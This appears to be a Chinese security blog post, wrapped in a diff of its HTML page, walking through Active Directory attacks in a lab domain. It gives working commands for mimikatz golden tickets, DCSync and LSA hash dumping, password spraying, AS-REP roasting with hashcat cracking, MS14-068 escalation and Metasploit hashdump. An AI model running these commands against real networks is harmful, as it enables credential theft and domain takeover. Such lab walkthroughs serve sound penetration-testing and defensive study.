@@ -1,0 +1,675 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="SE_Null">
+  <meta name="keywords" content="">
+  <title>域内攻击 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-12 16:24" pubdate>
+        October 12, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">域内攻击</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>本文介绍一些域内攻击的工具以及方法。</p>
+<a id="more"></a>
+<p>攻击机：kali：192.168.43.30</p>
+<p>客户机DC：win2012：192.168.8.211</p>
+<p>客户机：win7： 182.168.8.57</p>
+<p>以下有关在win7复现没有成功的，在win2008上复现成功，没有放置贴图。</p>
+<h2 id="1-kerberos攻击"><a href="#1-kerberos攻击" class="headerlink" title="1.kerberos攻击"></a>1.kerberos攻击</h2><h3 id="1-使用mimikatz的黄金票据-dcsync获得域密码"><a href="#1-使用mimikatz的黄金票据-dcsync获得域密码" class="headerlink" title="1.使用mimikatz的黄金票据+dcsync获得域密码"></a>1.使用mimikatz的黄金票据+dcsync获得域密码</h3><p>dcsync: mimikatz中的功能，可以有效地“假冒”一个域控制器，并可以向目标域控制器请求帐户密码数据</p>
+<p>首先伪造一个黄金票据</p>
+<p><code>kerberos: :golden /admin:Administrator /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT Hash NTLM&gt;  /ticket: Administrator.kiribi</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210202192045542.png" srcset="/img/loading.gif" alt="image-20210202192045542"></p>
+<p>在使用ptt进行票据攻击：<code>Kerberos::ptt Administrator.kiribi</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210202192205698.png" srcset="/img/loading.gif" alt="image-20210202192205698"></p>
+<p>此时已得到域控完整权限，可以使用psexec获得域控cmd权限：<code>psexec [\\域控ip](file://域控ip) cmd</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210202192514462.png" srcset="/img/loading.gif" alt="image-20210202192514462"></p>
+<p>也可以执行获取指定用户的hash值：<code>lsadump::dcsync /user:用户 /domain:域</code></p>
+<p>记得结束之后完成清楚票据：<code>kerberos::purge</code></p>
+<h3 id="2-域用户、密码枚举"><a href="#2-域用户、密码枚举" class="headerlink" title="2.域用户、密码枚举"></a>2.域用户、密码枚举</h3><p>github项目：<a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
+<p>DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒</p>
+<h4 id="1-枚举用户"><a href="#1-枚举用户" class="headerlink" title="1.枚举用户"></a>1.枚举用户</h4><p>在power shell中导入脚本:<code>Import-Module .\DomainPasswordSpray.ps1</code></p>
+<p>再执行以下内容进行用户名枚举</p>
+<pre><code class="hljs less"><span class="hljs-selector-tag">Get-DomainUserList</span> <span class="hljs-selector-tag">-Domain</span> 域名 <span class="hljs-selector-tag">-RemoveDisabled</span> <span class="hljs-selector-tag">-RemovePotentialLockouts</span> | <span class="hljs-selector-tag">Out-File</span> <span class="hljs-selector-tag">-Encoding</span> <span class="hljs-selector-tag">ascii</span> <span class="hljs-selector-tag">userlist</span><span class="hljs-selector-class">.txt</span>
+参数<span class="hljs-selector-pseudo">:Domain</span>指定要测试的域名
+参数<span class="hljs-selector-pseudo">:RemoveDisabled</span>尝试从用户列表删除禁用的账户
+参数<span class="hljs-selector-pseudo">:RemovePotentialLockouts</span>删除锁定账户
+参数: <span class="hljs-selector-tag">UserList</span>自定义用户列表(字典)。如果未指定，这将自动从域中获取<span class="hljs-selector-tag">5</span>参数<span class="hljs-selector-pseudo">:Password</span>指定单个密码进行口令测试
+参数<span class="hljs-selector-pseudo">:PasswordList</span>指定一个密码字典
+参数<span class="hljs-selector-pseudo">:OutFile</span>将结果保存到某个文件
+参数<span class="hljs-selector-pseudo">:Force</span>当枚举出第一个后继续枚举，不询问</code></pre>
+
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203004732222.png" srcset="/img/loading.gif" alt="image-20210203004732222"></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203004754984.png" srcset="/img/loading.gif" alt="image-20210203004754984"></p>
+<h4 id="2-枚举密码"><a href="#2-枚举密码" class="headerlink" title="2.枚举密码"></a>2.枚举密码</h4><p>相当于指定密码进行爆破.</p>
+<p>执行以下命令进行密码枚举：<code> Invoke-DomainPasswordspray -Domain 域名 -Password 密码 ASD -OutFile pass.txt</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203004925060.png" srcset="/img/loading.gif" alt="image-20210203004925060"></p>
+<h3 id="3-AS-REP-Roasting"><a href="#3-AS-REP-Roasting" class="headerlink" title="3.AS-REP-Roasting"></a>3.AS-REP-Roasting</h3><p><strong>原理</strong>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。</p>
+<p>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&idx=3&mid=2247488900&scene=21&sn=dc2689efec7757f7b432e1fb38b599d4#wechat_redirect">域内认证之Kerberos协议详解。</a></p>
+<p>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</p>
+<p><strong>攻击条件</strong></p>
+<ul>
+<li>域用户设置了 “ Do not require Kerberos preauthentication(不需要kerberos预身份验证) ”<ul>
+<li>开启命令<ul>
+<li><code>Import-Module  .PowerView.ps1 Set-DomainObject  -Identity  testb  -XOR  @&#123;userAccountControl=4194304&#125;  -Verbose</code></li>
+</ul>
+</li>
+<li>关闭命令<ul>
+<li><code>Import-Module  .PowerView.ps1 Set-DomainObject  -Identity  testb  -XOR  @&#123;userAccountControl=4194304&#125;  -Verbose</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>需要一台可与KDC进行通信的主机/用户</li>
+</ul>
+<p><strong>攻击方式</strong></p>
+<p>1.linux下可以使用GetNPUsers.py这款工具进行破解.</p>
+<p>2.windows下使用Rubeus.exe进行破解(需要.net3.5)</p>
+<p>获得一个hashes.asreproast文件：</p>
+<pre><code class="hljs awk">Rubeus.exe asreproast <span class="hljs-regexp">/format:hashcat /</span>outfile:hashes.asreproast</code></pre>
+
+<p>得到hashes.asreproast文件后可以使用hashcat或者john进行破解：</p>
+<pre><code class="hljs ada">hashcat -m <span class="hljs-number">18200</span> <span class="hljs-comment">--force -a 0 hashes.asreproast passwords_kerb.txt</span></code></pre>
+
+<p>3.powershell</p>
+<p>工具</p>
+<p>powerview.ps1：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</a></p>
+<p>ASREPRoast.ps1：<a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a></p>
+<p>使用powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p>
+<pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1
+<span class="hljs-keyword">Get</span>-DomainUser -PreauthNotRequired</code></pre>
+
+<p>使用ASREPRoast.ps1获取AS-REP返回的Hash</p>
+<pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\ASREPRoast.ps1
+<span class="hljs-keyword">Get</span>-ASREPHash -UserName 用户名 -Domain 域名 | <span class="hljs-keyword">Out</span>-<span class="hljs-keyword">File</span> -Encoding ASCII hash.txt</code></pre>
+
+<p>将hash.txt里面的除Hash字段其他的都删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">hashcat64</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-m</span> 18200 <span class="hljs-selector-tag">hash</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">pass</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">--force</span></code></pre>
+
+
+
+<h2 id="2-域内提权"><a href="#2-域内提权" class="headerlink" title="2.域内提权"></a>2.域内提权</h2><p>Ms14-086（支持到win2012,但是2012不稳定）</p>
+<p>通过是否打补丁(kb3011780)来判断是否存在漏洞</p>
+<p>生成一个文件ccache文件：<code>MS14-068.exe -u 用户名@域名 -p 明文密码 -s &lt;userSid&gt; -d 域控ip</code></p>
+<p>但是在win7上使用时会报错，可能是我域内环境配置有问题，在win2008时没有问题。</p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203151836389.png" srcset="/img/loading.gif" alt="image-20210203151836389"></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203151950021.png" srcset="/img/loading.gif" alt="image-20210203151950021"></p>
+<p>用mimikatz进行攻击：kerberos::ptc ccache文件</p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203152009209.png" srcset="/img/loading.gif" alt="image-20210203152009209"></p>
+<p>此时当前用户就是域管理员用户</p>
+<h2 id="3-域hash"><a href="#3-域hash" class="headerlink" title="3.域hash"></a>3.域hash</h2><p>需要域控权限</p>
+<p>1.mimikatz抓取</p>
+<p>可以使用mimikatz生成一个日志记录信息（会在当前目录下生成一个mimikatz.txt,之后操作以及结果都会被记录在日志中）:<code>log</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203154454934.png" srcset="/img/loading.gif" alt="image-20210203154454934"></p>
+<p>抓取域内用户的名称和hash：<code>lsadump::dcsync /domain:域控名 /all /csv</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203154445293.png" srcset="/img/loading.gif" alt="image-20210203154445293"></p>
+<p>或者使用：<code>lsadump::lsa /inject</code></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203154531731.png" srcset="/img/loading.gif" alt="image-20210203154531731"></p>
+<p>2.msf抓取</p>
+<p>先反弹一个会话</p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203152945003.png" srcset="/img/loading.gif" alt="image-20210203152945003"></p>
+<p>利用domain_hashdump模块进行抓取</p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153012768.png" srcset="/img/loading.gif" alt="image-20210203153012768"></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153023396.png" srcset="/img/loading.gif" alt="image-20210203153023396"></p>
+<p>由于当前是32bits的载荷运行在一个64bits的系统上，所以需要进行进程迁移</p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153047077.png" srcset="/img/loading.gif" alt="image-20210203153047077"></p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153100040.png" srcset="/img/loading.gif" alt="image-20210203153100040"></p>
+<p>之后再次运行hashdump，会得到一个数据库存储域内所有用户的信息</p>
+<p><img src="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/image-20210203153119397.png" srcset="/img/loading.gif" alt="image-20210203153119397"></p>
+<p>进行破解即可</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/mimikatz%E7%9A%84%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-dcsync/">mimikatz的黄金票据+dcsync</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%9F%9F%E7%94%A8%E6%88%B7%E3%80%81%E5%AF%86%E7%A0%81%E6%9E%9A%E4%B8%BE/">域用户、密码枚举</a>
+                    
+                      <a class="hover-with-bg" href="/tags/AS-REP-Roasting/">AS-REP-Roasting</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%8A%93%E5%8F%96%E5%9F%9Fhash/">抓取域hash</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/13/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">奇技淫巧</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+                        <span class="hidden-mobile">横向移动</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <!-- <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div> -->
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "域内攻击&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 100,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
